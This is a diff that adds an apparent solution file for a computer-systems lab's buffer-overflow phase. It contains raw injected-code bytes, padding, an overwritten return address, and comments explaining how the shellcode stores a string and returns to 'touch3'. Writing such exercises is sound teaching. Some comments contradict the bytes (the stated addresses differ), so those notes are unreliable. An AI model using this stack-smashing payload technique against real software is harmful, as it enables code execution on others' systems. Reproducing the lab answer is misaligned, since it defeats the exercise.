@@ -1,0 +1,19 @@
+/* top of input string, at 0x5561dc78 */
+48 c7 c0 00  00 61 55 c7  00 35 39 62  39 c7 40 04
+39 37 66 61  c7 40 08 00  00 00 00 48  89 c7 68 fa 
+18 40 00 c3  00 00 00 00 
+78 dc 61 55 /* return address, at 0x5561dca0 */
+
+/* 
+we use a address in stack that is beyond later cover but in same page to store the string 0x5561db00 
+in intel syntax string = 35 39 62 39: 39 37 66 61 :0a
+mov rax, 0x5561d000: 48 c7 c0 00 db 61 55, it seems that not in the same page is also ok
+mov dword ptr [rax ], 0x39623935: c7 00 35 39 62 39
+mov dword ptr [rax+4 ], 0x61663739: c7 40 04 39 37 66 61
+mov dword ptr [rax+8 ], 0x00000000: c7 40 08 00 00 00 00
+mov rdi, rax: 48 89 c7
+pushq 0x40184c: 68 fa 18 40 00
+ret: c3
+we save the str at $rax, then we move the string with \0 to rax with offset,
+finally move rax to rdi and return to touch3
+*/
